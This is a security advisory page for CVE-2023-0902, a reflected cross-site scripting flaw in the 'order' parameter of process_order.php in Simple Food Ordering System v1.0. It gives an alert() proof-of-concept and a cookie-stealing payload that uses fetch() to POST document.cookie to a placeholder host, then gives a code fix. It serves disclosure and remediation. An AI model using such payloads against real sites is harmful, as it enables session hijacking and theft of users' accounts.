---
title: Simple Food Ordering System v1.0 Cross-Site Scripting (XSS)
url: https://cxsecurity.com/issue/WLB-2023040034
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-08
fetch_date: 2025-10-04T11:29:38.877578
---

# Simple Food Ordering System v1.0 Cross-Site Scripting (XSS)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Simple Food Ordering System v1.0 Cross-Site Scripting (XSS)** **2023.04.07**  Credit:  **[Muhammad Navaid Zafar Ansari](https://cxsecurity.com/author/Muhammad%2BNavaid%2BZafar%2BAnsari/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-0902](https://cxsecurity.com/cveshow/CVE-2023-0902/ "Click to see CVE-2023-0902")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: Simple Food Ordering System v1.0 - Cross-Site Scripting (XSS)
# Exploit Author: Muhammad Navaid Zafar Ansari
# Date: 17 February 2023
### CVE Assigned:
\*\*[CVE-2023-0902](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0902)\*\* [mitre.org](https://www.cve.org/CVERecord?id=CVE-2023-0902) [nvd.nist.org](https://nvd.nist.gov/vuln/detail/CVE-2023-0902)
### Vendor Homepage:
> https://www.sourcecodester.com
### Software Link:
> [Simple Food Ordering System](https://www.sourcecodester.com/php/15418/simple-food-ordering-system-client-side-phpmysqli-free-source-code.html)
### Version:
> v 1.0
# Tested on: Windows 11
### What is Reflected Cross-Site Scripting:
> Reflected cross-site scripting (XSS) is a type of web vulnerability that occurs when a web application fails to properly sanitize user input, allowing an attacker to inject malicious code into the application's response to a user's request. When the user's browser receives the response, the malicious code is executed, potentially allowing the attacker to steal sensitive information or take control of the user's account.
### Affected Page:
> Vulnerable Page: process\_order.php
> In this page order parameter is vulnerable to Reflected Cross Site Scripting Attack
### Description:
> The Reflected XSS found in order parameter of process\_order.php page. Authenticated Reflected Cross-Site Scripting (XSS) is a serious vulnerability that can have a significant impact on the security of a web application and its users. The risk of Authenticated Reflected XSS is similar to that of Reflected XSS, but with the added danger that the attacker must first gain access to a valid user account in order to exploit the vulnerability. The main risk associated with Authenticated Reflected XSS is that it can allow an attacker to steal sensitive information or take control of a user's account on a web application. This can include login credentials, financial information, personal information, and more. Once an attacker gains access to a user's account, they can perform any actions that the user is authorized to do. In addition, Authenticated Reflected XSS can also be used as a stepping stone to launch more advanced attacks, such as phishing attacks, malware distribution, or distributed denial-of-service attacks. By gaining control of a user's account on a web application, an attacker can use that account as a launching point for further attacks against the user or the web application itself.
### Proof of Concept:
> Initially, I tried to verify the XSS attack, I used standard XSS payload <script>alert("Verification");</script> and the Below Image confirmed that, the parameter is vulnerable to reflected XSS.
> Payload: process\_order.php?order=<script>alert(1)<%2fscript>mjii5
> ![image](https://user-images.githubusercontent.com/123810418/219716828-62b529c9-8366-4051-8b2c-f9065b158089.png)
> Based on that, I have decided to make it realistic attack and use burp colloborator to hijack user cookie:
> Payload: process\_order.php?order=<script>fetch(%27http://dummyurl/%27,{method:%27POST%27,mode:%27no-cors%27,body:document.cookie});</script>
> ![image](https://user-images.githubusercontent.com/123810418/219717379-d085a7ec-29d4-4d2c-ba19-69e5011891e8.png)
### Recommendation:
> Whoever uses this CMS, should update line no 41 of process\_order.php with the following code to avoid cross-site scripting attack:
```
Old Code: <?php echo $\_GET['order']; ?>
New Code: <?php echo htmlspecialchars(strip\_tags($\_GET['order'])); ?>
```
Thank you for reading for more demo visit my github: https://github.com/navaidzansari/CVE\_Demo

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040034)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top